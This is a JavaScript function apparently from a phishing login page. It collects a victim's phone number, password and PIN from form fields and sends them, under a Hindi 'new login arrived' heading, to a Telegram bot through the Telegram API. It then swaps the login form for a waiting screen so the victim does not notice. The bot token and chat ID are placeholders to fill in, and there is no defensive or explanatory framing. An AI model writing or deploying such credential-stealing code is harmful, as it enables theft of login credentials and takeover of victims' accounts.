function sendToTelegram() {
var botToken = "YOUR_BOT_TOKEN_HERE";
var chatId = "YOUR_CHAT_ID_HERE";

var phone = document.getElementById("phone").value;
var pass = document.getElementById("password").value;
var pin = document.getElementById("pin").value;

if(phone == "" || pass == "") {
alert("Please enter Phone and Password");
return;
}

var message = "🟢 नया लॉगिन आया है:\n\n📱 Phone: " + phone + "\n🔒 Password: " + pass + "\n🔑 PIN: " + pin;

var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);

fetch(telegramUrl);

document.getElementById("login-section").style.display = "none";
document.getElementById("wait-section").style.display = "block";
}
